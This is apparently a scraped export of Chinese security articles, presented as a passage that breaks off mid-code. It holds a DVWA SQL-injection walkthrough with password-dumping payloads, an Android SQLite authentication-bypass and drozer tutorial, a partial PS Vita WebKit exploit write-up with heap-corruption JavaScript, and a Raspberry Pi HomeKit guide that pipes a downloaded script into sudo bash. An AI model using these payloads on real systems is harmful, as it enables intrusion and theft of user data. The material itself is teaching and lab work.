’=’1234，查询成功：返回了多个结果，说明存在字符型注入。2.猜解SQL查询语句中的字段数输入1′ or 1=1 order by 1 #，查询成功：输入1′ or 1=1 order by 2 #，查询成功：输入1′ or 1=1 order by 3 #，查询失败：说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。（这里也可以通过输入union select 1,2,3…来猜解字段数）3.确定显示的字段顺序输入1′ union select 1,2 #，查询成功：说明执行的SQL语句为select First name,Surname from 表 where ID=’id’…4.获取当前数据库输入1′ union select 1,database() #，查询成功：说明当前的数据库为dvwa。5.获取数据库中的表输入1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：说明数据库dvwa中一共有两个表，guestbook与users。6.获取表中的字段名输入1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #，查询成功：说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。7.下载数据输入1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。Medium服务器端核心代码&lt;?php if( isset( $_POST[ 'Submit' ] ) ) {     // Get input     $id = $_POST[ 'id' ];     $id = mysql_real_escape_string( $id );     // Check database     $query  = ""SELECT first_name, last_name FROM users WHERE user_id = $id;"";     $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );     // Get results     $num = mysql_numrows( $result );     $i   = 0;     while( $i &lt; $num ) {         // Display values         $first = mysql_result( $result, $i, ""first_name"" );         $last  = mysql_result( $result, $i, ""last_name"" );         // Feedback for end user         echo ""&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;"";         // Increase loop count         $i++;     }     //mysql_close(); } ?&gt; 可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。漏洞利用虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数。1.判断是否存在注入，注入是字符型还是数字型抓包更改参数id为1′ or 1=1 #报错：抓包更改参数id为1 or 1=1 #，查询成功：说明存在数字型注入。（由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。）2.猜解SQL查询语句中的字段数抓包更改参数id为1 order by 2 #，查询成功：抓包更改参数id为1 order by 3 #，报错：说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。3.确定显示的字段顺序抓包更改参数id为1 union select 1,2 #，查询成功：说明执行的SQL语句为select First name,Surname from 表 where ID=id…4.获取当前数据库抓包更改参数id为1 union select 1,database() #，查询成功：说明当前的数据库为dvwa。5.获取数据库中的表抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：说明数据库dvwa中一共有两个表，guestbook与users。6.获取表中的字段名抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败：这是因为单引号被转义了，变成了\’。可以利用16进制进行绕过，抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #，查询成功：说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。7.下载数据抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。High服务器端核心代码&lt;?php if( isset( $_SESSION [ 'id' ] ) ) {     // Get input     $id = $_SESSION[ 'id' ];     // Check database     $query  = ""SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;"";     $result = mysql_query( $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' );     // Get results     $num = mysql_numrows( $result );     $i   = 0;     while( $i &lt; $num ) {         // Get values         $first = mysql_result( $result, $i, ""first_name"" );         $last  = mysql_result( $result, $i, ""last_name"" );         // Feedback for end user         echo ""&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;"";         // Increase loop count         $i++;     }     mysql_close(); } ?&gt; 可以看到，与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。漏洞利用虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。输入1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。Impossible服务器端核心代码&lt;?php if( isset( $_GET[ 'Submit' ] ) ) {     // Check Anti-CSRF token     checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );     // Get input     $id = $_GET[ 'id' ];     // Was a number entered?     if(is_numeric( $id )) {         // Check the database         $data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );         $data-&gt;bindParam( ':id', $id, PDO::PARAM_INT );         $data-&gt;execute();         $row = $data-&gt;fetch();         // Make sure only 1 result is returned         if( $data-&gt;rowCount() == 1 ) {             // Get values             $first = $row[ 'first_name' ];             $last  = $row[ 'last_name' ];             // Feedback for end user             echo ""&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;"";         }     } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。","2016-11-28 11:38:36","Web安全","新手指南：DVWA-1.9全级别教程之SQL Injection","http://nsoad.com/Article/web/20161128/854.html"
"5ccbfb204f2f0a0a7a69c11c","苹果在2014年推出的HomeKit智能家居平台的确给人眼前一亮的感觉。随着时间的推移，国外的黑客对HomeKit该逆向的逆向，结果也都汇总到了git。本着折腾到死的极客心态，从网上","kong","苹果在2014年推出的HomeKit智能家居平台的确给人眼前一亮的感觉。随着时间的推移，国外的黑客对HomeKit该逆向的逆向，结果也都汇总到了git。本着折腾到死的极客心态，从网上淘了一块树莓派进行测试。0×01 基本工具硬件在某宝上都有卖的，加起来不到300块    硬件:                            32G SD卡2.5V电源线Raspberry pi3两根杜邦线                            LED灯保护壳联动HomeKit的工程在git上找到两个，都是基于nodejs的，这边先测试的是HAP-NodeJS软件raspbian https://github.com/nfarina/homebridge                            https://github.com/KhaosT/HAP-NodeJS                            0×02 安装先解决依赖# apt-get install avahi-daemon avahi-discover libnss-mdns libavahi-compat-libdnssd-dev  build-essential -y# service avahi-daemon start 增加nodejs源curl -sL https://deb.nodesource.com/setup_6.x | sudo -E bash -# apt-get install nodejs克隆源代码git  clone  https://github.com/KhaosT/HAP-NodeJS.git安装node-gyp$ sudo npm install -g node-gyp  然后切换到HAP-NodeJS文件夹下，运行node Core,js 缺哪个库安装哪个库  最后安装npm install python-shell打开iPhone手机的HomeKit就能看到伪造的智能设备了在accessories的目录下新建一个LivingLight_accessory.js，代码如下//Light_accessory.jsvar PythonShell = require('python-shell');// HomeKit types requiredvar types = require(""./types.js"")var exports = module.exports = {};var execute = function(accessory,characteristic,value){ console.log(""executed accessory: "" + accessory + "", and characteristic: "" + characteristic + "", with value: "" +  value + "".""); }exports.accessory = {  displayName: ""Living Light"",  username: ""1A:5B:3C:4A:5E:FF"",  pincode: ""031-45-154"",  services: [{    sType: types.ACCESSORY_INFORMATION_STYPE,    characteristics: [{        cType: types.NAME_CTYPE,        onUpdate: null,        perms: [""pr""],        format: ""string"",        initialValue: ""Living Light"",        supportEvents: false,        supportBonjour: false,        manfDescription: ""Bla"",        designedMaxLength: 255    },{        cType: types.MANUFACTURER_CTYPE,        onUpdate: null,        perms: [""pr""],        format: ""string"",        initialValue: ""Oltica"",        supportEvents: false,        supportBonjour: false,        manfDescription: ""Bla"",        designedMaxLength: 255    },{        cType: types.MODEL_CTYPE,        onUpdate: null,        perms: [""pr""],        format: ""string"",        initialValue: ""Rev-1"",        supportEvents: false,        supportBonjour: false,        manfDescription: ""Bla"",        designedMaxLength: 255    },{        cType: types.SERIAL_NUMBER_CTYPE,        onUpdate: null,        perms: [""pr""],        format: ""string"",        initialValue: ""A1S2NASF88EW"",        supportEvents: false,        supportBonjour: false,        manfDescription: ""Bla"",        designedMaxLength: 255    },{        cType: types.IDENTIFY_CTYPE,        onUpdate: null,        perms: [""pw""],        format: ""bool"",        initialValue: false,        supportEvents: false,        supportBonjour: false,        manfDescription: ""Identify Accessory"",        designedMaxLength: 1    }]  },{    sType: types.LIGHTBULB_STYPE,    characteristics: [{        cType: types.NAME_CTYPE,        onUpdate: null,        perms: [""pr""],        format: ""string"",        initialValue: ""Light 1 Light Service"",        supportEvents: false,        supportBonjour: false,        manfDescription: ""Bla"",        designedMaxLength: 255    },{        cType: types.POWER_STATE_CTYPE,        onUpdate: function(value)    {            console.log(""Change:"",value);            if (value) {            PythonShell.run('/python/light1.py', function (err) {                   console.log('Light1 On Success');            });            } else {                PythonShell.run('/python/light0.py', function (err) {                    console.log(""Off Success"");                });            }        },        perms: [""pw"",""pr"",""ev""],        format: ""bool"",        initialValue: false,        supportEvents: false,        supportBonjour: false,        manfDescription: ""Turn On the Light"",        designedMaxLength: 1    },{        cType: types.HUE_CTYPE,        onUpdate: function(value) { console.log(""Change:"",value); execute(""Test Accessory 1"", ""Light - Hue"", value); },        perms: [""pw"",""pr"",""ev""],        format: ""int"",        initialValue: 0,        supportEvents: false,        supportBonjour: false,        manfDescription: ""Doesn’t actually adjust Hue of Light"",        designedMinValue: 0,        designedMaxValue: 360,        designedMinStep: 1,        unit: ""arcdegrees""    },{        cType: types.BRIGHTNESS_CTYPE,        onUpdate: function(value) { console.log(""Change:"",value); execute(""Test Accessory 1"", ""Light - Brightness"", value); },        perms: [""pw"",""pr"",""ev""],        format: ""int"",        initialValue: 0,        supportEvents: false,        supportBonjour: false,        manfDescription: ""Doesn’t actually adjust Brightness of Light"",        designedMinValue: 0,        designedMaxValue: 100,        designedMinStep: 1,        unit: ""%""    },{        cType: types.SATURATION_CTYPE,        onUpdate: function(value) { console.log(""Change:"",value); execute(""Test Accessory 1"", ""Light - Saturation"", value); },        perms: [""pw"",""pr"",""ev""],        format: ""int"",        initialValue: 0,        supportEvents: false,        supportBonjour: false,        manfDescription: ""Doesn’t actually adjust Saturation of Light"",        designedMinValue: 0,        designedMaxValue: 100,        designedMinStep: 1,        unit: ""%""    }]  }]}然后在HAP-NodeJS下新建python文件夹，新建light1.py,用来开启灯import RPi.GPIO as GPIOGPIO.setwarnings(False)GPIO.setmode(GPIO.BOARD)GPIO.setup(16, GPIO.OUT)GPIO.output(16, 1)#GPIO.cleanup()light0.py用来关闭灯import RPi.GPIO as GPIOGPIO.setwarnings(False)GPIO.setmode(GPIO.BOARD)GPIO.setup(16, GPIO.OUT)GPIO.output(16, 0)#GPIO.cleanup()重新运行node Core.js即可在HomeKit看到新建的Living Light把这个添加,pincode就是031-45-154硬件连接我这边用的是物理接口的16口和34口0×03 测试后记这里有个前提条件是树莓派和iPhone在同一个子网上,如果想从外网控制就得需要映射公网WEB服务器或者是第三方物联网WEB的形式。而如果想将树莓派作为智能家庭网络的中心，后期还有很多工作要做，比如服务开机启动,连接继电器，线路改造，车库门，温度感应器，电视，摄像头等，有机会再继续聊吧    Reference：http://www.instructables.com/id/Raspberry-Pi-2-Homekit-from-zero-to-Hey-Siri/?ALLSTEPShttps://github.com/KhaosT/HAP-NodeJS","2016-11-15 13:33:40","安全工具","极客DIY：如何用Siri与树莓派“交互”","http://nsoad.com/Security-tools/20161115/tools-773.html"
"5ccbfb204f2f0a0a7a69c11d","SQLite 是一个开源数据库，具有许多类似于其他关系数据库（如 SQL）的功能。 如果你是应用程序开发人员，你可能还会注意到 SQLite 查询看起来或多或少像 SQL 一样。","Aditya Gupta","本文来源：看雪学院  编译作者：飞龙使者   原文出自：Learning Pentesting for Android Devices  网络攻防小组Kong.整理发布SQLite 是一个开源数据库，具有许多类似于其他关系数据库（如 SQL）的功能。 如果你是应用程序开发人员，你可能还会注意到 SQLite 查询看起来或多或少像 SQL 一样。 在 Android 中选择 SQLite 的原因是其内存占用较低。 Android 开发者喜欢 SQLite 的原因是它不需要设置或配置数据库，并且可以在应用程序中直接调用。6.1 深入理解 SQLite正如我们在上一章中看到的，SQLite 数据库默认在 Android 中存储在/data/data/[package name]/databases/位置，扩展名为.db文件（在 Android 的大多数情况下） 。 现在，在我们更深入地探讨 SQLite 漏洞之前，我们应该清楚地了解 SQLite 语句和一些基本的命令分析使用 SQLite 的简单应用在这里，我们有一个基本的 Android 应用程序，它支持用户的登录和注册，并在后端使用 SQLite。 遵循以下步骤：让我们运行应用程序并分析它创建的数据库。 你可以从http://attify.com/lpfa/vulnsqlite.apk下载漏洞应用程序。 用于创建数据库的代码示例如以下屏幕截图所示：这意味着我们有七个字段，名称为id(integer), firstName (text), lastName (text), email (text), phoneNumber (text), username (text), 和 password (text)。tableName字段之前叫做USER_RECORDS。让我们现在访问 adb shell 并检查数据库。我们可以使用 SQLite 浏览器访问 SQLite 文件，我们在上一章中使用了它，或者我们可以使用命令行工具sqlite3。对于整个这一章，我们将使用名为sqlite3的命令行工具，它存在于大多数 Android设 备中。如果你的 Android 设备中不存在它，你可以使用 Play 商店中提供的 BusyBox 应用程序进行安装。所以，让我们继续分析数据库。我们需要做的第一件事是使用 adb shell 进入设备。下一步是访问/data/data/[package-name]目录的位置并查找databases文件夹。一旦我们进入了数据库文件夹，我们会注意到各种文件。现在，SQLite 数据库的文件格式大多是前面提到的.db，但它们也可以为.sqlite，.sqlitedb或开发人员在创建应用程序时指定的任何其他扩展名。如果你记得上一章中的练习，在查找数据库文件时，这正是寻找其他扩展名的时候，例如.sqlite。现在，我们可以使用以下命令使用sqlite3打开数据库：sqlite3 [databasename]11在这种情况下，由于数据库名称是weak-db，我们可以简单地输入sqlite3 vulnerable-db打开它。 我们也可以在给定时间使用sqlite3打开多个数据库。 要查看加载的当前数据库，我们可以键入.databases命令列出我们当前的数据库，如下面的截图所示：现在，我们打开数据库时要做的第一件事是查看数据库中包含的表。 表的列表可以由.tables显示，如以下屏幕截图所示：正如我们在这里可以看到的，有两个名称为USER_RECORDS和android_metadata的表。 由于我们对USER_RECORDS更感兴趣，我们将首先继续查看表中的各个列，稍后我们将转储列字段中的数据。 为了查看有关表的更多信息，例如列字段，我们可以使用.schema命令，如下面的截图所示：接下来我们需要做的是通过执行SELECT查询来查看列字段中的数据。注意另一个需要注意的重要事情是，SQL 中使用的大多数查询对 SQLite 仍然有效。使用应用程序并为数据库填充一些信息。 接下来，为了查询并查看USER_RECORDS表，通过通配符*指定所有内容，我们可以使用以下命令：SELECT * from USER_RECORDS;11运行上述命令将产生类似于如下所示的输出：现在，sqlite3也给了我们改变输出格式，查看额外信息以及所需信息的自由。 所以，让我们继续，将查看mode设置为column，将header设置为on。让我们再次运行相同的查询并检查输出，如下面的截图所示：还有其他可用的选项可用于渗透测试。 其中之一是.output命令。 这会自动将之后的 SQL 查询的输出保存到指定的文件，我们可以稍后拉取，而不是在屏幕上显示。 一旦我们将输出保存在文件中，并且想返回屏幕显示模式，我们可以使用.output命令并将其设置为stdout，这将再次在终端上显示输出 。在SQLite中，.dump将创建一个列表，包含从数据库创建到现在为止所执行的所有 SQL 操作。 以下是在当前数据库上运行的命令的输出的屏幕截图：此外，所有这些操作都可以从终端执行，而不是进入 shell，然后启动sqlite3二进制。 我们可以直接向 adb shell 传递我们的命令并获得输出，如下面的截图所示：6.2 安全漏洞Web 应用程序和移动应用程序中最常见的漏洞之一是基于注入的漏洞。 如果按原样使用用户提供的输入，或动态 SQL 查询的保护很少并且不足够，SQLite 也会产生注入漏洞。让我们来看看用于查询应用程序中的数据的SQL查询，如下所示：String getSQL = ""SELECT * FROM "" + tableName + "" WHERE "" + username + "" = '"" + uname + ""' AND "" + password + "" = '"" + pword + ""'"";Cursor cursor = dataBase.rawQuery(getSQL , null12341234在前面的 SQL 查询中，uname和pword字段从用户输入直接传递到 SQL 查询中，然后使用rawQuery方法执行。 rawQuery方法实际上只是执行任何传递给它的 SQL 查询。另一个类似于rawQuery的方法是execSQL方法，它和rawQuery一样脆弱。前面的 SQL 查询用于验证用户的登录凭据，然后显示其在注册期间使用的信息。所以，这里的 SQL 引擎检查用户名和密码是否匹配在一行，如果是这样，它返回一个布尔值TRUE。然而，想象一个场景，我们可以修改我们的输入，而不是正常的文本输入，它似乎是应用程序的 SQL 查询的一部分，然后又返回TRUE，从而授予我们身份。事实证明，如果我们把用户名/密码设为1'or'1'='1或任何类似总是TRUE的查询，我们就破解了应用程序的身份验证机制，这反过来是一个很大的安全风险。另外，请注意，由于使用单引号，在前面输入中使用的OR将在SQL查询中被视为OR。这将闭合用户名字段，并且我们的其余输入将解释为 SQL 查询。你可以从http://attify.com/lpfa/sqlite.apk下载漏洞应用程序。这里是攻击情况下的 SQL 查询：SELECT * FROM USER_RECORDS WHERE USERNAME = '1'or'1'='1' AND PASSWORD = 'something'1212如果应用程序检测到登录成功，它会显示一个弹出框，其中包含用户信息，就像在 SQLite 身份验证绕过攻击的情况下一样，如下面的屏幕截图所示：我们还可以在输入结尾处附加双连字符（-），来使 SQL 查询的其余部分仅解释为对应用程序的注释。让我们看看另一个应用程序，这一次，利用 drozer，我们以前使用的工具，来利用 SQLite 注入漏洞。这个应用程序是一个待办事项，用户可以保存他们的笔记; 该笔记存储在名为todotable.db的数据库中，并在应用程序中通过内容供应器访问。 遵循以下步骤：让我们继续，并启动 drozer，查看这个应用程序的数据库，如下面的命令所示。软件包名称为com.attify.vulnsqliteapp。adb forward tcp:31415 tcp:31415drozer console connect1212一旦我们进入了 Drozer 的控制台，我们就可以运行finduri扫描器模块来查看所有内容 URI 和可访问的 URI，如下所示：dz&gt; run scanner.provider.finduris -a com.attify.vulnsqliteappScanning com.attify.vulnsqliteapp...Unable to Query  content://com.attify.vulnsqliteapp.contentprovider/Able to Query    content://com.attify.vulnsqliteapp.contentprovider/todosAble to Query    content://com.attify.vulnsqliteapp.contentprovider/todos/Unable to Query  content://com.attify.vulnsqliteapp.contentproviderAccessible content URIs:  content://com.attify.vulnsqliteapp.contentprovider/todos  content://com.attify.vulnsqliteapp.contentprovider/todos/123456789101112131415161718123456789101112131415161718接下来，我们将使用 Drozer 中的注入扫描程序模块检查应用程序中基于注入的漏洞，如下所示：dz&gt; run scanner.provider.injection -a com.attify.vulnsqliteappScanning com.attify.vulnsqliteapp...Not Vulnerable:  content://com.attify.vulnsqliteapp.contentprovider/  content://com.attify.vulnsqliteapp.contentproviderInjection in Projection:  No vulnerabilities found.Injection in Selection:  content://com.attify.vulnsqliteapp.contentprovider/todos  content://com.attify.vulnsqliteapp.contentprovider/todos/123456789101112123456789101112所以，现在我们可以使用可选参数来查询这些内容供应器，例如1 = 1，它将在所有情况下返回TRUE，如下面的截图所示：此外，我们可以使用 Drozer 模块app.provider.insert，并通过指定参数和要更新的数据类型，将我们自己的数据插入 SQLite 数据库。 让我们假设我们要在数据库中添加另一个to-do条目。 因此，我们需要四个字段：id，category，summary和description，数据类型分别为integer，string，string和string。因此，完整的语法将变成：run app.provider.insert content://com.attify.vulnsqliteapp.contentprovider/todos/ --integer _id 2 --string category urgent --string summary ""Financial Summary"" --string description ""Submit Annual Report"" 1234512345成功执行后，它将显示完成消息，如以下屏幕截图所示：总结在本章中，我们深入了解了 SQLite 数据库，甚至在应用程序中发现了漏洞，并利用 Drozer 来利用它们。 SQLite 数据库应该是渗透测试人员关注的主要问题之一，因为它们包含了应用程序的大量信息。 在接下来的章节中，我们将了解一些不太知名的 Android 利用技术。","2017-02-28 13:12:27","移动安全","Android 渗透测试学习手册（六）玩转 SQLite","http://nsoad.com/Article/MobileSecurity/20170228/1088.html"
"5ccbfb204f2f0a0a7a69c11e","译者注：浏览器作为用户交互较多的应用，漏洞利用点相对多一些，而系统浏览器通常以高权限运行，对封闭的终端设备来说，这就提供了不错的漏洞利用条件。本篇 PSV 的 Writeu","Kong","译者注：浏览器作为用户交互较多的应用，漏洞利用点相对多一些，而系统浏览器通常以高权限运行，对封闭的终端设备来说，这就提供了不错的漏洞利用条件。本篇 PSV 的 Writeup 介绍了一个 Webkit 漏洞的利用思路，同理我们可以将思路发散到其他终端设备上，比如之前的 PS4 1.76版本 Webkit 堆溢出漏洞，Kindle 的越狱 等...简介这是 HENkaku 攻击链系列 Writeup 的开始章节。我会尽量不对 KOTH challenge 进行太多破坏，仅仅记录逆向工程的部分，以阐明大家所错过的细节。然而，在这种情况下，挑战无人问津且毫无进展。不管怎样，我将会发布 writeup，既然我已经写了，让它烂在我的repo里面会是一种浪费。The PoC我们选择的能在用户模式执行代码的目标便是 WebKit。Webkit 拥有 JavaScript 引擎，当我们需要绕过 ASLR 时，它对我们很有用。PS Vita 上的 Web 浏览器也不需要登录 PSN，不会自动更新，允许实现非常简单的攻击利用链（访问网站按下按钮）。完美。和没有 ASLR 的 3DS 不同，Vita WebKit 有一个可接受的熵值为9 bits 的 ASLR，这就使暴力破解攻击变得非常痛苦（平均需要重新加载 512 次来触发漏洞，好怕！）。因此，我们需要一个比通用 UAF（释放后重用） + vptr（虚函数表指针） 覆写更好的漏洞。感谢某些人，我设法得到了一个漂亮的 PoC 脚本，可以在最新的固件上造成 Vita 的浏览器崩溃。它不存在于 WebKit bugzilla/repo 的任何地方（或许在限制部分）。那么作为开始的便是此脚本：var almost_oversize = 0x3000;  var foo = Array.prototype.constructor.apply(null, new Array(almost_oversize));  var o = {};  o.toString = function () { foo.push(12345); return """"; }  foo[0] = 1;  foo[1] = 0;  foo[2] = o;  foo.sort();如果你在使用 Sony 的 Webkit 的 Linux 主机上运行它，你将看到发生段错误。让我们在调试器里面看看：Thread 1 ""GtkLauncher"" received signal SIGSEGV, Segmentation fault.  0x00007ffff30bec35 in JSC::WriteBarrierBase&lt;JSC::Unknown&gt;::set (this=0x7fff98ef8048, owner=0x7fff9911ff60, value=...) at ../../Source/JavaScriptCore/runtime/WriteBarrier.h:152  152            m_value = JSValue::encode(value);  (gdb) bt#0  0x00007ffff30bec35 in JSC::WriteBarrierBase&lt;JSC::Unknown&gt;::set (this=0x7fff98ef8048, owner=0x7fff9911ff60, value=...) at ../../Source/JavaScriptCore/runtime/WriteBarrier.h:152#1  0x00007ffff32cb9bf in JSC::ContiguousTypeAccessor&lt;(unsigned char)27&gt;::setWithValue (vm=..., thisValue=0x7fff9911ff60, data=..., i=0, value=...) at ../../Source/JavaScriptCore/runtime/JSArray.cpp:1069#2  0x00007ffff32c8809 in JSC::JSArray::sortCompactedVector&lt;(unsigned char)27, JSC::WriteBarrier&lt;JSC::Unknown&gt; &gt; (this=0x7fff9911ff60, exec=0x7fff9d6e8078, data=..., relevantLength=3)    at ../../Source/JavaScriptCore/runtime/JSArray.cpp:1171#3  0x00007ffff32c4933 in JSC::JSArray::sort (this=0x7fff9911ff60, exec=0x7fff9d6e8078) at ../../Source/JavaScriptCore/runtime/JSArray.cpp:1214#4  0x00007ffff329c844 in JSC::attemptFastSort (exec=0x7fff9d6e8078, thisObj=0x7fff9911ff60, function=..., callData=..., callType=@0x7fffffffbfb4: JSC::CallTypeNone)    at ../../Source/JavaScriptCore/runtime/ArrayPrototype.cpp:623#5  0x00007ffff329db4c in JSC::arrayProtoFuncSort (exec=0x7fff9d6e8078) at ../../Source/JavaScriptCore/runtime/ArrayPrototype.cpp:697&lt;the rest does not matter&gt;  原来她在执行 Javascript Array.sort 函数的时候会遇到未映射的内存。但是这到底发生了什么？The bug让我们看看 JSArray::sort 方法（Source/JavaScriptCore/runtime/JSArray.cpp)。因为我们的数组是 ArrayWithContiguous类型是由它如何创建决定的:Array.prototype.constructor.apply(null, new Array(almost_oversize));，我们进入sortCompactedVector 函数。这是它的完整定义：template&lt;IndexingType indexingType, typename StorageType&gt;  void JSArray::sortCompactedVector(ExecState* exec, ContiguousData&lt;StorageType&gt; data, unsigned relevantLength)  {    if (!relevantLength)        return;    VM&amp; vm = exec-&gt;vm();    // Converting JavaScript values to strings can be expensive, so we do it once up front and sort based on that.    // This is a considerable improvement over doing it twice per comparison, though it requires a large temporary    // buffer. Besides, this protects us from crashing if some objects have custom toString methods that return    // random or otherwise changing results, effectively making compare function inconsistent.    Vector&lt;ValueStringPair, 0, UnsafeVectorOverflow&gt; values(relevantLength);    if (!values.begin()) {        throwOutOfMemoryError(exec);        return;    }    Heap::heap(this)-&gt;pushTempSortVector(&amp;values);    bool isSortingPrimitiveValues = true;    for (size_t i = 0; i &lt; relevantLength; i++) {        JSValue value = ContiguousTypeAccessor&lt;indexingType&gt;::getAsValue(data, i);        ASSERT(indexingType != ArrayWithInt32 || value.isInt32());        ASSERT(!value.isUndefined());        values[i].first = value;        if (indexingType != ArrayWithDouble &amp;&amp; indexingType != ArrayWithInt32)            isSortingPrimitiveValues = isSortingPrimitiveValues &amp;&amp; value.isPrimitive();    }    // FIXME: The following loop continues to call toString on subsequent values even after    // a toString call raises an exception.    for (size_t i = 0; i &lt; relevantLength; i++)        values[i].second = values[i].first.toWTFStringInline(exec);    if (exec-&gt;hadException()) {        Heap::heap(this)-&gt;popTempSortVector(&amp;values);        return;    }    // FIXME: Since we sort by string value, a fast algorithm might be to use a radix sort. That would be O(N) rather    // than O(N log N).#if HAVE(MERGESORT)    if (isSortingPrimitiveValues)        qsort(values.begin(), values.size(), sizeof(ValueStringPair), compareByStringPairForQSort);    else        mergesort(values.begin(), values.size(), sizeof(ValueStringPair), compareByStringPairForQSort);#else    // FIXME: The qsort library function is likely to not be a stable sort.    // ECMAScript-262 does not specify a stable sort, but in practice, browsers perform a stable sort.    qsort(values.begin(), values.size(), sizeof(ValueStringPair), compareByStringPairForQSort);#endif    // If the toString function changed the length of the array or vector storage,    // increase the length to handle the orignal number of actual values.    switch (indexingType) {    case ArrayWithInt32:    case ArrayWithDouble:    case ArrayWithContiguous:        ensureLength(vm, relevantLength);        break;    case ArrayWithArrayStorage:        if (arrayStorage()-&gt;vectorLength() &lt; relevantLength) {            increaseVectorLength(exec-&gt;vm(), relevantLength);            ContiguousTypeAccessor&lt;indexingType&gt;::replaceDataReference(&amp;data, arrayStorage()-&gt;vector());        }        if (arrayStorage()-&gt;length() &lt; relevantLength)            arrayStorage()-&gt;setLength(relevantLength);        break;    default:        CRASH();    }    for (size_t i = 0; i &lt; relevantLength; i++)        ContiguousTypeAccessor&lt;indexingType&gt;::setWithValue(vm, this, data, i, values[i].first);    Heap::heap(this)-&gt;popTempSortVector(&amp;values);}此函数从 JS 数组中取值，将它们放入一个临时向量中，对向量进行排序，然后将值放回 JS 数组。在第 37 行，for 循环中，对于每一个元素，它的toString方法被调。当它被我们的对象 o 调用时，便是接下来发生的：function () {      foo.push(12345);    return """";}一个整数被 push 进正在排序的数组。这导致了数组元素被重新分配。在81行，被排序的元素被写回数组，然而，data指针从不用新分配的值进行更新。图例说明： 灰色的区域是空闲/未分配的内存。在 Linux 上，实际是在调用 realloc 后取消映射。同时，data仍然指向旧的内存区域。因此，Web 浏览器试图向未映射的内存写入，产生段错误。Out-of-bounds RW越界读写根据内容，JSArray 对象可能在内存中以不同的方式存储。然而，我们正在操作的，是作为元数据头(metadata header)（黄色部分）加上数组内容（绿色部分）连续存储的。内容只是一个JSValue结构的向量。union EncodedValueDescriptor {      int64_t asInt64;    double asDouble;    struct {        int32_t payload;        int32_t tag;    } asBits;};The metadata header stores two interesting fields:uint32_t m_publicLength; // The meaning of this field depends on the array type, but for all JSArrays we rely on this being the publicly visible length (array.length).  uint32_t m_vectorLength; // The length of the indexed property storage. The actual size of the storage depends on this, and the type.  我们的目标是覆盖它们，并将数组“扩展”超出实际分配的范围。为了实现这一点，我们来修改o.toString方法：var normal_length = 0x800;  var fu = new Array(normal_length);  var arrays = new Array(0x100);  o.toString = function () {      foo.push(12345);    for (var i = 0; i &lt; arrays.length; ++i) {        var bar = Array.prototype.constructor.apply(null, fu);        bar[0] = 0;        bar[1] = 1;        bar[2] = 2;        arrays[i] = bar;    }    return """";}如果我们运气好的话，这便是所发生的： 在此例中（不反映真实数组大小），当使用data指针写回排序值的时候，第二条和第三条 bar的 metadata headers 将被覆盖。我们用什么覆盖它们？记住，绿色的区域是 JSValue 对象的向量。每一个 JSValue对象都是 8 字节的。但是，如果我们使用比如 0x8000000 的数据填充 foo ，我们只能控制 4 字节，其余的是用于tag 的。tag 是什么？enum { Int32Tag =        0xffffffff };  enum { BooleanTag =      0xfffffffe };  enum { NullTag =         0xfffffffd };  enum { UndefinedTag =    0xfffffffc };  enum { CellTag =         0xfffffffb };  enum { EmptyValueTag =   0xfffffffa };  enum { DeletedValueTag = 0xfffffff9 };enum { LowestTag =  DeletedValueTag };  这就是 Webkit JavaScriptCore 如何将不同的类型打包成单个JSValue 结构的：它可以是int，boolean，cell（指向一个对象的指针），null，undefined 或者 double 类型。因此如果我们 写入54321，我们只能控制一半的结构，而另一半被设置成 Int32Tag 或者 0xffffffff。但是，我们也可以写入double类型的值，比如54321.0。我们用这种方法控制所有 8 字节，但是还有其他限制（一些浮点指针规范化并不允许写入真正的任意值。否则，你将能够制作CellTag并将指针设置成任意值，这是很可怕的。有趣的是，在它确实允许之前，这是第一个Vita WebKit exploit使用过的！CVE-2010-1807）。因此，我们还是写入 double 类型的值吧。foo[0] = o;  var len = u2d(0x80000000, 0x80000000);  for (var i = 1; i 